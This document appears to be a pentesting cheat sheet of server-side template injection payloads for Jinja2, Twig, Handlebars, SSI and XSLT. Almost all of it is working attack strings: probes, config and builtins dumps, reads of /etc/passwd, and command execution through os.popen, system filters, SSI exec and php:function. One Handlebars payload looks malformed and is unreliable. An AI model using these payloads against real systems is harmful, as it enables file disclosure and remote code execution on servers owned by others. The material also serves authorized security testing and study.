test for errors with this : 
```
${{<%[%'"}}%\.
```

![[diagram.png]]
For JINJA :

web application's configuration
```jinja2
{{ config.items() }}
```

built-in functions 
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

LFI
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

RCE
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

For TWIG:

information about the template
```twig
{{ _self }}
```

LFI 
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

RCE
```twig
{{ ['id'] | filter('system') }}
```



**SSI**:


RCE
`<!--#exec cmd="whoami" -->`|

XML 

```xml
<xsl:value-of select="php:function('system','id')" />
```

## New Tricks

### Trick 1
- Scenario: Jinja2 expression executed command through unsafe template render.
- Payload: `{{ cycler.__init__.__globals__.os.popen("id").read() }}`

### Trick 2
- Scenario: Twig math probe confirmed SSTI before full exploit chain.
- Payload: `{{7*7}}`

### Trick 3
- Scenario: Handlebars helper abuse exposed server environment variables.
- Payload: `{{#with "s" as |x|}}{{lookup ../this "process".env}}{{/with}}`
